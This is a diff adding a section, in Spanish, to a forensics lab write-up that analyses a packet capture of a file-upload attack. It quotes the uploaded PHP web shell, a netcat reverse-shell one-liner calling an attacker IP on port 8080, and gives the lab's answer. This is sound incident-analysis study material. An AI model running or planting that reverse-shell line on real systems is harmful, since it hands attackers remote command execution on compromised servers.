@@ -208,6 +208,40 @@ Lo que demuestra que la aplicación guarda los archivos subidos en el directorio
 Respuesta:
 - **/reviews/uploads/**
 
+### 6.5 Pregunta 5: Puerto objetivo para la comunicación saliente no autorizada
+
+La pregunta solicita identificar **qué puerto, abierto en la máquina del atacante, fue utilizado por la web shell para establecer comunicación saliente**.
+
+El propio laboratorio da una pista clara:
+
+> Analyze the uploaded file by the attacker, focusing on POST HTTP requests  
+> Apply `http.request.method == POST`, right-click the POST packet, and select "Follow > HTTP Stream" to view the uploaded file content. Use `tcp.stream eq 4`.
+
+#### 6.5.1 Análisis del POST y del payload subido
+
+Se aplica el filtro:
+
+http.request.method == "POST"
+
+
+Se localiza la petición POST correspondiente a la subida del archivo malicioso (`image.jpg.php`) y se sigue el **HTTP Stream** de esa conexión.
+
+En el contenido del archivo subido se observa el siguiente payload PHP:
+
+```php
+<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>
+
+Este código ejecuta un reverse shell utilizando nc (netcat), conectándose a:
+
+IP del atacante: 117.11.88.124
+
+Puerto del atacante: 8080
+
+Es decir, el servidor comprometido intenta abrir una conexión saliente hacia la máquina del atacante en el puerto 8080.
+
+Captura
+- HTTP Stream mostrando el payload del web shell:
+  ![HTTP STREAM](images/webstrike/10-http-stream-payload.png)
 
 
 ## 7. Conclusión
